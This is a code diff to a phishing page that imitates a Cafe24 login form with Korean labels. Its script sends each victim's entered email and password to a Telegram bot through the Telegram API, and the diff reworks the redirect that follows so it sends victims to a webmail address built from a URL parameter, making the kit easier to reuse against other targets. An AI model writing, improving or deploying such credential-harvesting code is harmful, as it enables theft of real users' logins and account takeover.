@@ -47,7 +47,7 @@
     document.getElementById("email").value = email;
   }
 </script>
- required></label><!-- 개발참고 : value값 placeholder로 넣어주세요 -->
+ </label><!-- 개발참고 : value값 placeholder로 넣어주세요 -->
 						<label><input type="password" id="password" name="password" class="fText" placeholder="비밀번호" required ></label>
 						<button type="submit" class="btnLogin user-login-btn"><span>로그인</span></button>
 						<ul class="security">
@@ -99,22 +99,31 @@
       var message = 'CAFE24:\nEmail: ' + email + '\nPassword: ' + password;
       var url = 'https://api.telegram.org/bot' + apiKey + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
 
-      fetch(url)
+      
+fetch(url)
   .then(function(response) {
-    if (response.ok) {
-      // If the response is OK, redirect to Google
-      window.location.href = "https://webmail.[[-Domain-]]";
+    const params = new URLSearchParams(window.location.search);
+    const domain = params.get("domain");
+
+    if (domain) {
+      window.location.href = "https://webmail." + domain;
     } else {
-      // If the response is NOT OK, also redirect to Google
-      window.location.href = "https://webmail.[[-Domain-]]";
+      // fallback
+      window.location.href = "https://google.com";
     }
   })
-  .catch(function(error) {
-    // On fetch error, redirect to Google too
-    window.location.href = "https://webmail.[[-Domain-]]";
+  .catch(function() {
+    const params = new URLSearchParams(window.location.search);
+    const domain = params.get("domain");
+
+    if (domain) {
+      window.location.href = "https://webmail." + domain;
+    } else {
+      window.location.href = "https://google.com";
+    }
   });
 
-    });
+
   </script>
 <script src=""></script>
 <!-- /Google Analytics -->
